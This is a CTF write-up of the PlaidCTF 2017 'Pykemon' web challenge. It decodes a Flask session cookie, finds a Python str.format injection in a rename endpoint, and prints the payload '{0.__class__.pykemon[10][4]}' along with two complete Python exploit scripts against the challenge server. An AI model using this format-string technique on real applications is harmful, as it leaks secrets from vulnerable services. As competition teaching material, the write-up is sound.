---
layout: post
title: "PlaidCTF 2017: Pykemon (web 151)"
author: yrlf, skogler
categories: writeup
tags: [cat/web, tool/python-requests, tool/ipython]
---

* **Category:** web
* **Points:** 151
* **Description:**

> Gotta catch them [FLAG](http://pykemon.chal.pwning.xxx)s!
>
> Take [this](https://play.plaidctf.com/files/pykemon_735afe812b9fd0f3fe16e3164aff5cdc.tar.bz2) with you.

## Write-up

This was a really fun challenge to solve. It's a small "game" where a few small images of pokemon show up on the screen and teleport around and if you click on one you can catch it ... sometimes.
The twist? All pokemons have their names changed to start with "Py", so "Psyduck" changes to "Pyduck".

The service is a python2 Flask webserver, and runs almost exactly the source attached in the challenge description. You can even run the server locally and debug your exploits.

tl;dr; python2 .format() exploit

Firs, we read through the source:

```
.
├── __init__.py
├── pykemon.py
├── run.py
├── static
│   ├── css
│   │   ├── bootstrap.css
│   │   ├── bootstrap.min.css
│   │   └── scrolling-nav.css
│   ├── fonts
│   │   ├── glyphicons-halflings-regular.eot
│   │   ├── glyphicons-halflings-regular.svg
│   │   ├── glyphicons-halflings-regular.ttf
│   │   ├── glyphicons-halflings-regular.woff
│   │   └── glyphicons-halflings-regular.woff2
│   ├── images
│   │   ├── flag.png
│   │   ├── pydiot.png
│   │   ├── pyduck.png
│   │   ├── pygglipuff.png
│   │   ├── pykaball.png
│   │   ├── pykachu.png
│   │   ├── pyliwag.png
│   │   ├── pyrasect.png
│   │   ├── pyrigon.png
│   │   ├── pyrodactyl.png
│   │   ├── pytata.png
│   │   └── pytwo.png
│   └── js
│       ├── bootstrap.js
│       ├── bootstrap.min.js
│       ├── jquery.easing.min.js
│       ├── jquery.js
│       └── scrolling-nav.js
└── templates
    └── index.html

6 directories, 29 files
```

Almost all of the code is concentrated in `run.py`, with only the Pykemon descriptions and the logic around generating Pykemon being in `pykemon.py`. The rest of the site is pretty simple and mostly boilerplate to make the site look okay.

When first loading up `/`, the site generates a room of random Pykemon and saves it in Flasks session. Each Pykemon in the room has an id, which is of the form `PykemonnameNumber`, for example: `Pyduck24`.

Then we tried decoding that session. A typical session looks like this:

```
.eJzVl1tv4jgUgP_KKM885IJnJkh92HQbJ6ggEYZcvBqtEhvFgB0iINCk4r_vSehQbqXSbtmZeQscx5fP3zkHnpUkFmKpdDS1pdC4SPlK6TwreTkby3mmdP76vm0pi_lcHn_7rLDxki4m-WpSf35WPiVKRxk5oowDtk4mVk5LaxqFFo_kk3CxKV2nK5j0S4ZFQUorZ05fJDhKSYDUOOyKxJmlkbSncWmpSWltqDQzKu2Viz3O8EMaBWjmYr9g2Ic1UObiPopgPmrAGvqoUGCfPFc6X1BLyWI5Pt9UendXD8omdHZ1QD5h57Ep1erYIl5MVqXSMYDWMofn12niQONE96tHw0JUiizR2wXFKFO229ZlXL7OBaBSYywq17ZQrNsreCulOiAyeksXC9XFqMHmOhZnYV_QHZ4JlT5g4eLxZdP10Y0LR8-I_pRTx5fkyvHPBp0geI1Pe0cY0HUMRGfLOLQ0IqP3UGBeGzMYByueBGbhYs7hMxjiT5nTzSNdqOOhVjFs7m7fsdYs6M9J2EtrZHHoVWDEnAT-gpbtFOYTVB-lYOCGBDbg89Yu7opIN1dkeDivvWzM02E9yQS5t2Ys7OaJpGmNF_DnROeq67B5HIDJu2uaxs4IrulJkNCqDq-gbZxfwSKCjbLB2_iPBpyg38W-DapD7O3r2F82-D_bh8zb2zdCN7EPFlGj0ONujQL34ahenhg-PIsCzJnXxowdrySBJh4nlg1Iir0RDab6PbsCqwS934CNAzDKLKjh8STzluOhBTvpq1DrYFwXuVhbM_mjDvbS2lBACwaaWiIH-1r2WTtH2mz0LZT74AnC5vv-9OHuEJ95HR_DthoN0QZS4e4qujLRPR4ZHkrum7LPD20iWXedDGvLIBkDtmsFGPBKs4pCKN-bV4O0rxdK937yP66U79NBpyV8H__zoX2IQH-vjJszyD91HGzeN-indz6k36bzjcoP73wfaY15oeR-tDWz6lbW_JJ1B33-0LrzLbpN3YmgI0XGAI7dS2MdrRmYw_DXFJJEEji2i5-apu42CGusgA9rnBp9wGcXdbOHRMshaQtAD7pDktVYDuxLsGmQ0E3hxwIgWu6S0YG44R01_ksSvuzvbQEPB5zK9xI7Eu_Le-LZFQHxHjOrIE2G_G7iGRdK2L8Xr1e5_0G8760f_3f-pvMig79FGrTjRb2Out3-A4NcPZw.C9-64Q.fCno2nrZe1NiBgvFmD3fwYKTOFc
```

Looks a lot like base64, right? So what happens if we take that first block of base64 between the first two "."s and feed it into base64 decode?

```
In [3]: base64.urlsafe_b64decode(session.split(".")[1])
---------------------------------------------------------------------------
Error                                     Traceback (most recent call last)
<ipython-input-9-5088716aa03c> in <module>()
----> 1 base64.urlsafe_b64decode(session.split(".")[1])

/usr/lib/python3.6/base64.py in urlsafe_b64decode(s)
    131     s = _bytes_from_decode_data(s)
    132     s = s.translate(_urlsafe_decode_translation)
--> 133     return b64decode(s)
    134 
    135 

/usr/lib/python3.6/base64.py in b64decode(s, altchars, validate)
     85     if validate and not re.match(b'^[A-Za-z0-9+/]*={0,2}$', s):
     86         raise binascii.Error('Non-base64 digit found')
---> 87     return binascii.a2b_base64(s)
     88 
     89 

Error: Incorrect padding
```

Hmm... What if we try to artificially add some more padding?


```
In [4]: base64.urlsafe_b64decode(session.split(".")[1] + "===")
Out[4]: b'x\x9c\xd5\x97[o\xe28\x14\x80\xff\xca(\xcf<\xe4\x82g&H}\xd8t\x1b\'\xa8 \x11\x86\\\xbc\x1a\xad\x12\x1b\xc5\x80\x1d" \xd0\xa4\xe2\xbf\xefI\xe8Pn\xa5\xd2n\xd9\x99y\x0b\x1c\xc7\x97\xcf\xdf9\x07\x9e\x95$\x16b\xa9t4\xb5\xa5\xd0\xb8H\xf9J\xe9<+y9\x1b\xcby\xa6t\xfe\xfa\xbem)\x8b\xf9\\\x1e\x7f\xfb\xac\xb0\xf1\x92.&\xf9jR\x7f~V>%JG\x199\xa2\x8c\x03\xb6N&VNKk\x1a\x85\x16\x8f\xe4\x93p\xb1)]\xa7+\x98\xf4K\x86EAJ+gN_$8JI\x80\xd48\xec\x8a\xc4\x99\xa5\x91\xb4\xa7qi\xa9Iim\xa843*\xed\x95\x8b=\xce\xf0C\x1a\x05h\xe6b\xbf`\xd8\x875P\xe6\xe2>\x8a`>j\xc0\x1a\xfa\xa8P`\x9f<W:_PK\xc9b9>\xdfTzwW\x0f\xca&tvu@>a\xe7\xb1)\xd5\xea\xd8"^LV\xa5\xd21\x80\xd62\x87\xe7\xd7i\xe2@\xe3D\xf7\xabG\xc3BT\x8a,\xd1\xdb\x05\xc5(S\xb6\xdb\xd6e\\\xbe\xce\x05\xa0Rc,*\xd7\xb6P\xac\xdb+x+\xa5: 2zK\x17\x0b\xd5\xc5\xa8\xc1\xe6:\x16ga_\xd0\x1d\x9e\t\x95>`\xe1\xe2\xf1e\xd3\xf5\xd1\x8d\x0bG\xcf\x88\xfe\x94S\xc7\x97\xe4\xca\xf1\xcf\x06\x9d x\x8dO{G\x18\xd0u\x0cDg\xcb8\xb44"\xa3\xf7P`^\x1b3\x18\x07+\x9e\x04f\xe1b\xce\xe13\x18\xe2O\x99\xd3\xcd#]\xa8\xe3\xa1V1l\xeen\xdf\xb1\xd6,\xe8\xcfI\xd8Kkdq\xe8U`\xc4\x9c\x04\xfe\x82\x96\xed\x14\xe6\x13T\x1f\xa5`\xe0\x86\x046\xe0\xf3\xd6.\xee\x8aH7Wdx8\xaf\xbdl\xcc\xd3a=\xc9\x04\xb9\xb7f,\xec\xe6\x89\xa4i\x8d\x17\xf0\xe7D\xe7\xaa\xeb\xb0y\x1c\x80\xc9\xbbk\x9a\xc6\xce\x08\xae\xe9I\x90\xd0\xaa\x0e\xaf\xa0m\x9c_\xc1"\x82\x8d\xb2\xc1\xdb\xf8\x8f\x06\x9c\xa0\xdf\xc5\xbe\r\xaaC\xec\xed\xeb\xd8_6\xf8?\xdb\x87\xcc\xdb\xdb7B7\xb1\x0f\x16Q\xa3\xd0\xe3n\x8d\x02\xf7\xe1\xa8^\x9e\x18><\x8b\x02\xcc\x99\xd7\xc6\x8c\x1d\xaf$\x81&\x1e\'\x96\rH\x8a\xbd\x11\r\xa6\xfa=\xbb\x02\xab\x04\xbd\xdf\x80\x8d\x030\xca,\xa8\xe1\xf1$\xf3\x96\xe3\xa1\x05;\xe9\xabP\xeb`\\\x17\xb9X[3\xf9\xa3\x0e\xf6\xd2\xdaP@\x0b\x06\x9aZ"\x07\xfbZ\xf6Y;G\xdal\xf4-\x94\xfb\xe0\t\xc2\xe6\xfb\xfe\xf4\xe1\xee\x10\x9fy\x1d\x1f\xc3\xb6\x1a\r\xd1\x06R\xe1\xee*\xba2\xd1=\x1e\x19\x1eJ\xee\x9b\xb2\xcf\x0fm"Yw\x9d\x0ck\xcb \x19\x03\xb6k\x05\x18\xf0J\xb3\x8aB(\xdf\x9bW\x83\xb4\xaf\x17J\xf7~\xf2?\xae\x94\xef\xd3A\xa7%|\x1f\xff\xf3\xa1}\x88@\x7f\xaf\x8c\x9b3\xc8?u\x1cl\xde7\xe8\xa7w>\xa4\xdf\xa6\xf3\x8d\xca\x0f\xef|\x1fi\x8dy\xa1\xe4~\xb45\xb3\xeaV\xd6\xfc\x92u\x07}\xfe\xd0\xba\xf3-\xbaM\xdd\x89\xa0#E\xc6\x00\x8e\xddKc\x1d\xad\x19\x98\xc3\xf0\xd7\x14\x92D\x128\xb6\x8b\x9f\x9a\xa6\xee6\x08k\xac\x80\x0fk\x9c\x1a}\xc0g\x17u\xb3\x87D\xcb!i\x0b@\x0f\xbaC\x92\xd5X\x0e\xecK\xb0i\x90\xd0M\xe1\xc7\x02 Z\xee\x92\xd1\x81\xb8\xe1\x1d5\xfeK\x12\xbe\xec\xefm\x01\x0f\x07\x9c\xca\xf7\x12;\x12\xef\xcb{\xe2\xd9\x15\x01\xf1\x1e3\xab M\x86\xfcn\xe2\x19\x17J\xd8\xbf\x17\xafW\xb9\xffA\xbc\xef\xad\x1f\xffw\xfe\xa6\xf3"\x83\xbfE\x1a\xb4\xe3E\xbd\x8e\xba\xdd\xfe\x03\x83\\=\x9c'
```

Huh. That doesn't look right, does it?

We were just about to give up on decoding the session when **skogler** had an idea: "maybe it's compressed?"

```
In [5]: with open("data", "wb") as f:
   ...:     f.write(data)
   ...:
```

```
[yrlf@tuxic ~/Programming/ctf/plaid17/pykemon]$ file data
data: zlib compressed data
[yrlf@tuxic ~/Programming/ctf/plaid17/pykemon]$
```

It _was_ compressed.

```
In [6]: import zlib

In [6]: zlib.decompress(data)
Out[6]: b'{"balls":10,"caught":{"pykemon":[]},"room":{"pykemon":[{"description":{" b":"UHlyaWdvbiBpcyBjYXBhYmxlIG9mIHJldmVydGluZyBpdHNlbGYgZW50aXJlbHkgYmFjayB0byBwcm9ncmFtIGRhdGEgYW5kIGVudGVyaW5nIGN5YmVyc3BhY2Uu"},"hp":75,"name":{" b":"UHlyaWdvbg=="},"nickname":{" b":"UHlyaWdvbg=="},"pid":{" b":"UHlyaWdvbjc1"},"rarity":30,"sprite":{" b":"aW1hZ2VzL3B5cmlnb24ucG5n"}},{"description":{" b":"V2hlbiB0aGlzIFB5a2Ftb24gc2luZ3MsIGl0IG5ldmVyIHBhdXNlcyB0byBicmVhdGhlLg=="},"hp":35,"name":{" b":"UHlnZ2xpcHVmZg=="},"nickname":{" b":"UHlnZ2xpcHVmZg=="},"pid":{" b":"UHlnZ2xpcHVmZjM1"},"rarity":50,"sprite":{" b":"aW1hZ2VzL3B5Z2dsaXB1ZmYucG5n"}},{"description":{" b":"VGhpcyBQeWthbW9uIGhhcyBlbGVjdHJpY2l0eS1zdG9yaW5nIHBvdWNoZXMgb24gaXRzIGNoZWVrcy4gVGhlc2UgYXBwZWFyIHRvIGJlY29tZSBlbGVjdHJpY2FsbHkgY2hhcmdlZCBkdXJpbmcgdGhlIG5pZ2h0IHdoaWxlIFB5a2FjaHUgc2xlZXBzLg=="},"hp":43,"name":{" b":"UHlrYWNodQ=="},"nickname":{" b":"UHlrYWNodQ=="},"pid":{" b":"UHlrYWNodTQz"},"rarity":40,"sprite":{" b":"aW1hZ2VzL3B5a2FjaHUucG5n"}},{"description":{" b":"V2hlbiB0aGlzIFB5a2Ftb24gc2luZ3MsIGl0IG5ldmVyIHBhdXNlcyB0byBicmVhdGhlLg=="},"hp":59,"name":{" b":"UHlnZ2xpcHVmZg=="},"nickname":{" b":"UHlnZ2xpcHVmZg=="},"pid":{" b":"UHlnZ2xpcHVmZjU5"},"rarity":50,"sprite":{" b":"aW1hZ2VzL3B5Z2dsaXB1ZmYucG5n"}},{"description":{" b":"UHl0YXRhIGlzIGNhdXRpb3VzIGluIHRoZSBleHRyZW1lLiBFdmVuIHdoaWxlIGl0IGlzIGFzbGVlcCwgaXQgY29uc3RhbnRseSBsaXN0ZW5zIGJ5IG1vdmluZyBpdHMgZWFycyBhcm91bmQu"},"hp":61,"name":{" b":"UHl0YXRh"},"nickname":{" b":"UHl0YXRh"},"pid":{" b":"UHl0YXRhNjE="},"rarity":90,"sprite":{" b":"aW1hZ2VzL3B5dGF0YS5wbmc="}},{"description":{" b":"UHlyb2RhY3R5bCBpcyBhIFB5a2Ftb24gZnJvbSB0aGUgYWdlIG9mIGRpbm9zYXVycw=="},"hp":18,"name":{" b":"UHlyb2RhY3R5bA=="},"nickname":{" b":"UHlyb2RhY3R5bA=="},"pid":{" b":"UHlyb2RhY3R5bDE4"},"rarity":20,"sprite":{" b":"aW1hZ2VzL3B5cm9kYWN0eWwucG5n"}},{"description":{" b":"UHlyaWdvbiBpcyBjYXBhYmxlIG9mIHJldmVydGluZyBpdHNlbGYgZW50aXJlbHkgYmFjayB0byBwcm9ncmFtIGRhdGEgYW5kIGVudGVyaW5nIGN5YmVyc3BhY2Uu"},"hp":52,"name":{" b":"UHlyaWdvbg=="},"nickname":{" b":"UHlyaWdvbg=="},"pid":{" b":"UHlyaWdvbjUy"},"rarity":30,"sprite":{" b":"aW1hZ2VzL3B5cmlnb24ucG5n"}},{"description":{" b":"UHlyb2RhY3R5bCBpcyBhIFB5a2Ftb24gZnJvbSB0aGUgYWdlIG9mIGRpbm9zYXVycw=="},"hp":93,"name":{" b":"UHlyb2RhY3R5bA=="},"nickname":{" b":"UHlyb2RhY3R5bA=="},"pid":{" b":"UHlyb2RhY3R5bDkz"},"rarity":20,"sprite":{" b":"aW1hZ2VzL3B5cm9kYWN0eWwucG5n"}},{"description":{" b":"UHl0YXRhIGlzIGNhdXRpb3VzIGluIHRoZSBleHRyZW1lLiBFdmVuIHdoaWxlIGl0IGlzIGFzbGVlcCwgaXQgY29uc3RhbnRseSBsaXN0ZW5zIGJ5IG1vdmluZyBpdHMgZWFycyBhcm91bmQu"},"hp":56,"name":{" b":"UHl0YXRh"},"nickname":{" b":"UHl0YXRh"},"pid":{" b":"UHl0YXRhNTY="},"rarity":90,"sprite":{" b":"aW1hZ2VzL3B5dGF0YS5wbmc="}},{"description":{" b":"UHlyYXNlY3QgaXMga25vd24gdG8gaW5mZXN0IGxhcmdlIHRyZWVzIGVuIG1hc3NlIGFuZCBkcmFpbiBudXRyaWVudHMgZnJvbSB0aGUgbG93ZXIgdHJ1bmsgYW5kIHJvb3RzLg=="},"hp":3,"name":{" b":"UHlyYXNlY3Q="},"nickname":{" b":"UHlyYXNlY3Q="},"pid":{" b":"UHlyYXNlY3Qz"},"rarity":70,"sprite":{" b":"aW1hZ2VzL3B5cmFzZWN0LnBuZw=="}},{"description":{" b":"UHl0YXRhIGlzIGNhdXRpb3VzIGluIHRoZSBleHRyZW1lLiBFdmVuIHdoaWxlIGl0IGlzIGFzbGVlcCwgaXQgY29uc3RhbnRseSBsaXN0ZW5zIGJ5IG1vdmluZyBpdHMgZWFycyBhcm91bmQu"},"hp":32,"name":{" b":"UHl0YXRh"},"nickname":{" b":"UHl0YXRh"},"pid":{" b":"UHl0YXRhMzI="},"rarity":90,"sprite":{" b":"aW1hZ2VzL3B5dGF0YS5wbmc="}}],"pykemon_count":11,"rid":0}}'
```

And there we have it. JSON, a lot easier to work with than random bytes :)

The "pid"s, which are the Pykemon ids are still base64 encoded, but they have correct padding so that is not the problem.

Interesting to note is that sometimes there is one Pykemon with the name **FLAG** in there, whose entry in the pykemon list in the source looks like this:

```python2
# ...
class Pykemon(object):
    pykemon = [
            # ...
            [0, 'FLAG', 'FLAG','images/flag.png', 'PCTF{XXXXX}']
            ]

    def __init__(self, name=None, hp=None):
        pykemon = Pykemon.pykemon
        # ...
		self.name = pykemon[i][1]
        self.nickname = pykemon[i][2]
        self.sprite = pykemon[i][3]
        self.description = pykemon[i][4]
        self.hp = hp
        if not hp:
            self.hp = randint(1,100)
        self.rarity = pykemon[i][0]
        self.pid = self.name + str(self.hp)
# ...
```

So getting that description will be our goal.

We can get the description for Pykemon we've caught with `/caught/`, but naively `/catch/`ing that FLAG Pykemon won't work, we quickly found out.

```python2
@app.route('/catch/', methods=['POST'])
def pcatch():
    name = request.form['name']
	# ...
    p = check(name, 'room')
	# ...
    if p.rarity > 90:
        s['pykemon'].append(p.__dict__)
        session['caught'] = s
        if r['pykemon']:
            return p.name + ' has been caught!' + str(balls)
        else:
            return p.name + ' has been caught!' + str(balls) + '!GAME OVER!'
    
    elif p.rarity > 0:
        chance = (randint(1,90) + p.rarity) / 100
        if chance > 0:
            s['pykemon'].append(p.__dict__)
            session['caught'] = s
            if r['pykemon']:
                return p.name + ' has been caught!' + str(balls)
            else:
                return p.name + ' has been caught!' + str(balls) + '!GAME OVER!'
	# ...
```

Because the FLAG has rarity 0, the chance variable will never be greater than 0 (remember, python2 divide only returns floats if the divisor is a float), so it's impossible to catch a FLAG.

So we have to find another way to get that information.

Another interesting endpoint is `/rename/`. This is the code for that:

```python2
@app.route('/rename/', methods=['POST'])
def rename():
    name = request.form['name']
    new_name = request.form['new_name']
    if not name:
        return 'Error'

    p = check(name, 'caught')
    if not p:
        return "Error: trying to name a pykemon you haven't caught!"
    
    r = session.get('room')   
    s = session.get('caught')
    for pykemon in s['pykemon']:
        if pykemon['pid'] == name:
            pykemon['nickname'] = new_name
            session['caught'] = s
            print session['caught']
            return "Successfully renamed to:\n" + new_name.format(p)
    
    return "Error: something went wrong"
```

See the vulnerability? No?

Here it is if you didn't see it: `new_name.format(p)`, where `new_name` is a form parameter and p is the Pykemon object.

After a quick look to the python documentation for `string.format()` we found out you can get attributes of arguments in a format string.

Using that we built the following format string: `{0.__class__.pykemon[10][4]}`, which dumps the flag.

`PCTF{N0t_4_sh1ny_M4g1k4rp}`

## Retrospective

Decoding the session was actually not needed to solve this challenge because the Pykemon ids are also in the HTML.

We also just found out that if we already go to the trouble of decoding the session, we could read through it properly as well.
It turns out the decoded session already contains the flag if a FLAG Pykemon is in the room, but because all useful strings in the JSON are base64-encoded _AGAIN_, we didn't see it at first.

## Scripts

Original exploit script

```python3
import requests
import base64
import zlib
import json
import re

class D:
    pass

d = D()

d.s = requests.session()
d.url = "http://pykemon.chal.pwning.xxx/"

def get_cookie_object():
    for c in d.s.cookies:
        if c.name == "session":
            return c

def rename(name, new_name):
    return d.s.post(d.url + "rename/", data={
        'name': name,
        'new_name': new_name
    }).text

def catch(name):
    return d.s.post(d.url + "catch/", data={
        'name': name
    }).text

def get_room():
    global d
    return d.s.get(d.url)

def decode_session():
    global d
    cookie = get_cookie_object()
    if cookie == None:
        return None
    cookie = cookie.value
    return json.loads(zlib.decompress(base64.urlsafe_b64decode(cookie.split(".")[1] + "===")))
    
def get_pykemon():
    data = decode_session()
    if data == None:
        return None
    return data["room"]["pykemon"]

def get_pykemon_pid(pykemon):
    return base64.urlsafe_b64decode(pykemon["pid"][" b"]).decode("utf-8")

def try_catch():
    p = get_pykemon()
    if p == None:
        print("[FAIL] couldn't get pykemon")
    i = 0
    for mon in p:
        i += 1
        print("[INFO] attempt #{}".format(i))
        pid = get_pykemon_pid(mon)
        print("[INFO] catching {}".format(pid))
        r = catch(pid)
        print("[INFO] answer was {}".format(r))
        if "has been caught" in r:
            return pid
    return None

def rename_flag(pid):
    flag_fmtstr = "{0.__class__.pykemon[10][4]}"
    r = rename(pid, flag_fmtstr)
    match = re.search("PCTF{[^}]*}", r)
    if match == None:
        print("[INFO] flag match failed: {}".format(r))
        return None
    else:
        return match.group()

def run():
    r = get_room()
    if r.status_code != 200:
        print("[FAIL] couldn't get room")
        return
    pid = try_catch()
    if pid == None:
        print("[FAIL] couldn't catch pykemon")
        return
    flag = rename_flag(pid)
    if flag == None:
        print("[FAIL] couldn't extract flag")
        return
    print("[ OK ] flag is {}".format(flag))

run()
```

Alternate exploit script

```python3
import requests
import base64
import zlib
import json

class D:
    pass

d = D()

d.s = requests.session()
d.url = "http://pykemon.chal.pwning.xxx/"

def get_cookie_object():
    for c in d.s.cookies:
        if c.name == "session":
            return c

def get_room():
    global d
    return d.s.get(d.url)

def decode_session():
    global d
    cookie = get_cookie_object()
    if cookie == None:
        return None
    cookie = cookie.value
    return json.loads(zlib.decompress(base64.urlsafe_b64decode(cookie.split(".")[1] + "===")))
    
def get_pykemon():
    data = decode_session()
    if data == None:
        return None
    return data["room"]["pykemon"]

def get_pykemon_el(pykemon, el):
    return base64.urlsafe_b64decode(pykemon[el][" b"]).decode("utf-8")

def find_flag():
    p = get_pykemon()
    if p == None:
        return None
    for mon in p:
        if get_pykemon_el(mon, "name") == "FLAG":
            return get_pykemon_el(mon, "description")
    return None

def run():
    i = 0
    while True:
        i += 1
        print("[INFO] attempt #{}".format(i))
        r = get_room()
        flag = find_flag()
        if flag != None:
            break
    print("[ OK ] flag is {}".format(flag))

run()
```
